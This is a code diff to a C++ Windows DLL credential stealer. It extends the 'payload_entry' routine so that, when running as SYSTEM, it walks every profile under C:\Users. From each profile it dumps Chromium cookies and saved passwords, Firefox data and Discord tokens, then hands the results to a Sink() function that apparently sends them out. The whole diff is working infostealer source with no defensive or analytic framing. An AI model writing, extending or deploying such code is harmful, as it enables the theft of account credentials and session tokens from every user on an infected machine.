@@ -1497,6 +1497,29 @@ extern "C" __declspec(dllexport) void CALLBACK noop(HWND, HINSTANCE, LPSTR, int)
 // pinpoint crashes without the loader lock swallowing the exception
 extern "C" __declspec(dllexport) DWORD WINAPI entry_stub(void*, unsigned long, void*){ return 1; }
 
+// One (local, roaming) pair = one Windows profile. Dumping a single pair was
+// enough while the payload ran as the user; a SYSTEM payload sees only
+// systemprofile under %LOCALAPPDATA%, where no browser has ever run, so the user
+// profiles have to be enumerated (same reason cookielog.py walks C:\Users).
+static void DumpRoots(const wchar_t* la, const wchar_t* aa){
+    for(unsigned i=0;i<sizeof(g_br)/sizeof(g_br[0]);i++){
+        wchar_t root[1024]; lstrcpyW(root,la); lstrcatW(root,g_br[i].rel);
+        wchar_t alt[1024];  lstrcpyW(alt,aa);  lstrcatW(alt,g_br[i].rel);
+        if(GetFileAttributesW(root)==INVALID_FILE_ATTRIBUTES) lstrcpyW(root,alt);
+        if(GetFileAttributesW(root)==INVALID_FILE_ATTRIBUTES) continue;
+        Dbg("payload_entry: found chromium profile");
+        LoadLocalState(g_br[i].name, root);
+        DumpChromium(g_br[i].name,root,g_br[i].exe);
+        DumpPasswords(g_br[i].name,root,g_br[i].exe);
+    }
+    Dbg("payload_entry: before DumpFirefox");
+    DumpFirefox(aa);
+    Dbg("payload_entry: after DumpFirefox");
+    Dbg("payload_entry: before DumpDiscordTokens");
+    DumpDiscordTokens(aa);
+    Dbg("payload_entry: after DumpDiscordTokens");
+}
+
 extern "C" __declspec(dllexport) DWORD WINAPI payload_entry(HINSTANCE h, DWORD reason, LPVOID)
 {
 #ifdef DEBUG
@@ -1525,27 +1548,33 @@ extern "C" __declspec(dllexport) DWORD WINAPI payload_entry(HINSTANCE h, DWORD r
     LoadLibraryA("bcrypt.dll");
     LoadLibraryA("ws2_32.dll");
     wchar_t la[1024], aa[1024];
-    if(!GetEnvironmentVariableW(L"LOCALAPPDATA",la,1024)){ Dbg("payload_entry: no LOCALAPPDATA"); return 2; }
-    if(!GetEnvironmentVariableW(L"APPDATA",aa,1024)){ Dbg("payload_entry: no APPDATA"); return 2; }
+    bool have_la = GetEnvironmentVariableW(L"LOCALAPPDATA",la,1024) != 0;
+    bool have_aa = GetEnvironmentVariableW(L"APPDATA",aa,1024) != 0;
+    if(!have_la || !have_aa){ Dbg("payload_entry: no LOCALAPPDATA/APPDATA"); return 2; }
     Dbg("payload_entry: env OK, dumping");
     PutS("[");
     Dbg("payload_entry: after PutS([, entering chromium loop");
-    for(unsigned i=0;i<sizeof(g_br)/sizeof(g_br[0]);i++){
-        wchar_t root[1024]; lstrcpyW(root,la); lstrcatW(root,g_br[i].rel);
-        wchar_t alt[1024];  lstrcpyW(alt,aa);  lstrcatW(alt,g_br[i].rel);
-        if(GetFileAttributesW(root)==INVALID_FILE_ATTRIBUTES) lstrcpyW(root,alt);
-        if(GetFileAttributesW(root)==INVALID_FILE_ATTRIBUTES) continue;
-        Dbg("payload_entry: found chromium profile");
-        LoadLocalState(g_br[i].name, root);
-        DumpChromium(g_br[i].name,root,g_br[i].exe);
-        DumpPasswords(g_br[i].name,root,g_br[i].exe);
+    DumpRoots(la, aa);
+    // SYSTEM: the user profiles are not reachable through the environment, so
+    // enumerate C:\Users. Duplicate roots are skipped to avoid re-dumping.
+    WIN32_FIND_DATAW fd;
+    HANDLE u = FindFirstFileW(L"C:\\Users\\*", &fd);
+    if(u != INVALID_HANDLE_VALUE){
+        do{
+            if(!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
+            if(fd.cFileName[0] == L'.') continue;
+            wchar_t ul[1024], ua[1024];
+            lstrcpyW(ul, L"C:\\Users\\"); lstrcatW(ul, fd.cFileName);
+            lstrcatW(ul, L"\\AppData\\Local");
+            lstrcpyW(ua, L"C:\\Users\\"); lstrcatW(ua, fd.cFileName);
+            lstrcatW(ua, L"\\AppData\\Roaming");
+            if(lstrcmpiW(ul,la)==0 && lstrcmpiW(ua,aa)==0) continue;
+            if(GetFileAttributesW(ul)==INVALID_FILE_ATTRIBUTES) continue;
+            Dbg("payload_entry: dumping another user profile");
+            DumpRoots(ul, ua);
+        } while(FindNextFileW(u, &fd));
+        FindClose(u);
     }
-    Dbg("payload_entry: before DumpFirefox");
-    DumpFirefox(aa);
-    Dbg("payload_entry: after DumpFirefox");
-    Dbg("payload_entry: before DumpDiscordTokens");
-    DumpDiscordTokens(aa);
-    Dbg("payload_entry: after DumpDiscordTokens");
     Dbg("payload_entry: extraction done, calling Sink");
     bool ok=Sink();
     Dbg(ok?"payload_entry: Sink OK":"payload_entry: Sink FAILED");
